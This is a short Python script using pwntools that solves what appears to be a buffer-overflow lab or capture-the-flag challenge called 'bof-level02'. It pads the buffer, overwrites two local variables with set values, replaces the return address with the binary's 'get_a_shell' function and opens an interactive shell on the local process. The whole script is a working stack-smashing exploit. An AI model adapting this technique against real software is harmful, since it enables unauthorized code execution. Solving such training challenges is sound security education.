from pwn import *

elf = ELF("./bof-level02")
get_shell_addr = p32(elf.symbols["get_a_shell"])

a = 0x68676665
b = 0x64636261

buf_len = 0x24 - 0xc

message = buf_len * b"A" + p32(b) + p32(a) + b"A" * 8  + get_shell_addr

p = process("./bof-level02")
p.sendline(message)
p.interactive()

